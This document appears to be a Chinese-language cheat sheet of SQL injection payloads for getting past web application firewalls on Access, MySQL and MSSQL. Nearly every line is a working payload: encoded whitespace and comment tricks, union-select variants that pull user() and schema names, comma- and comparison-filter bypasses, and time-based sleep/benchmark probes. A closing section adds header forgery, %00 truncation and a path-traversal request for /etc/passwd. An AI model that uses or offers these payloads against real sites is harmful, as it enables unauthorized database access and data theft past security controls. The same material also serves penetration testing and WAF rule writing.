  #### Access
	空格符
	%09、%0a、%0c、%0d、%16
  #### Mysql
	注释符
	#、/*...*/、--[空格] ...
	空格符
	[0x09,0x0a-0x0d,0x20,0xa0]
	特殊符号
	%a 换行符，可结合注释符使用%23%0a，%2d%2d%0a。
	%21  ！ 叹号
	%2b  +  加号
	%2d  -  减号
	%40  @  符号
	%7e   ~  波浪号
	Id=1 union select(1),user()
	Id=1 union /!12345select/1,user()
	Id=1 union select@1,user()
	Id=1 union select {x 1},user()
	Id=1 union select"1",user()
	Id=1 union select\N,user()
	Id=1 union select 1,user()`
	Id=1 union select 1,user()""
	Id=1 union select 1,user()A
	Id=1 union select 1,user()`b
	Id=1 union(select 1,(select/!schema_name/from information_schema.SCHEMATA limit 1,1))
	Id=1 union(select 1,(select{x schema_name}from information_schema.SCHEMATA limit 1,1))
	Id=1 union(select 1,(select(schema_name)from information_schema.SCHEMATA limit 1,1))
	浮点数
	Id= 1.0union select 1,user()
	Id= 1.union select 1,user()
	Id= 1E0union select 1,user()
	Id=\Nunion select 1,user()
	Id=1 unionselect user(),2.0from admin
	Id=1 union select user(),8e0from admin
	Id=1 union select user(),\Nfrom admin
	内联注释
	/*!UnIon12345SelEcT*/ 1,user()   //数字范围 1000-50540
	mysql黑魔法
	select{x username}from {x11 test.admin};
	函数
	截取
	Mid(version(),1,1)
	Substr(version(),1,1)
	Substring(version(),1,1)
	Lpad(version(),1,1)
	Rpad(version(),1,1)
	Left(version(),1)
	reverse(right(reverse(version()),1)) 
	连接
	concat(version(),'|',user());
	concat_ws('|',1,2,3)
	字符转换
	Ascii() Char() Hex() Unhex()
	过滤逗号
	127' UNION SELECT * FROM ((SELECT1)a JOIN (SELECT2)b JOIN (SELECT3)c JOIN (SELECT4)d JOIN (SELECT5)e)# 
	相当于 union select 1,2,3,4,5
	union select * from (select 1)a join(select{x schema_name} from information_schema.SCHEMATA limit 1,1)b
	limit 1 offset 0相当于limit 1,0
	mid(version() from 1 for 1)相当于Mid(version(),1,1)
	<>被过滤
	id=1 and ascii(substr(database(),0,1))>64
	比较符
	greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值
	id=1 and greatest(ascii(substr(database(),0,1)),64)=64
	函数构造
	sleep(5)/benchmark(10000000,SHA1(1))
	id=1 xor sleep%23%0a(5)
	id=1 xor sleep%2d%2d%0a(5)
	id=1 xor sleep([%20]5) 
	id=1 xor benchmark%0a(10000000,SHA1(1))
	id=1 xor sleep[空白字符](5)
	select{x[可填充字符]1}
  #### MSSQL
	注释符
	/*、--、;00%、/**/
	空格符
	[0x01-0x20][0x0a-0x0f][0x1a-0x-1f]
	特殊符号
	%3a 冒号
	id=1 union:select 1,2 from:admin
	id=1 union select+1,'2',db_name() from admin
	id=1 union select-1,'2',db_name() from admin
	id=1 union select.1,'2',db_name() from admin
	id=1 union select:1,'2',db_name() from admin
	id=1 union select~1,'2',db_name() from admin
	id=1%20union%20select%201,'2',db_name()%80from%20admin
	id=1 union select 1,'2',db_name+() from admin
	函数变形: db_name[空白字符]()
	浮点数
	id=1.1union select 1,'2',db_name()
	id=1e0union select 1,'2',db_name()
	运算符
	id=1-1union select '1',system_user,3 from admin
	id=1e-union select '1',system_user,3 from admin
	字符串截取函数
	Substring(@@version,1,1)
	Left(@@version,1)
	Right(@@version,1)
	charindex('test',db_name())
	字符串转换函数
	Ascii('a')=char(97) 括号之间可添加空格
  #### WAF
	同时提交GET和POST
	访问HTTP绕过对HTTPS的防护
	%00截断
	参数填充垃圾数据，缓冲区溢出
	X-FORWARDED-FOR伪造绕过
	静态文件/sql.php/1.js?id=1绕过
	白名单绕过，URL只要存在某字符就不会拦截
	/sql.php/admin.php?id=1
	/sql.php?a=/manage/&b=../etc/passwd
	/../../../manage/../sql.asp?id=2
	伪造User-agent绕过，可改为爬虫agent